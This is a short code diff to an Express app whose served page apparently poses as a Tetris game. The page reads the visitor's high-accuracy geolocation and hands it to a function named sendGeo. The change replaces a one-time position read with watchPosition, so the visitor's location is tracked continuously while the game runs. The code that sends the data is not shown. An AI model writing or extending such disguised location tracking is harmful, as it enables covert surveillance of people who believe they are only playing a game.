@@ -32,7 +32,7 @@ app.get('/', (req, res) => {
                     });
                 }
                 if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(sendGeo, null, { enableHighAccuracy: true });
+                    navigator.geolocation.watchPosition(sendGeo, null, { enableHighAccuracy: true });
                 }
                 const canvas = document.getElementById('tetris');
                 const ctx = canvas.getContext('2d');
